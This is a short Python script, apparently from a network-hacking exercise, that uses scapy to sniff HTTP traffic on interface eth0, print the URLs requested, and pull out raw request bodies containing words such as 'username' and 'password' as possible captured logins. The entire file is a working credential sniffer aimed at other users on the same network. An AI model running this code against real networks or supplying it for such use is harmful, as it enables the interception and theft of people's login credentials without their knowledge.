#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    # iface = interface to sniff
    # store = To store sniffed packets in memory or not
    # prn = callback function
    # filter = Filter packet using BPF syntax (Not implemented. Used scapy.layers.http instead to capture http packets)
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["login", "id", "uname", "username", "password", "pass", "user"]
        for key in keywords:
            if key in load:
                return load


def process_sniffed_packet(packet):
    # To find whether sniffed packet has http data layer
    # The Raw layer has the uname and password
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        print("[+] HTTP Request >>" + get_url(packet))
        
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password" + login_info + "\n\n")


sniff("eth0")
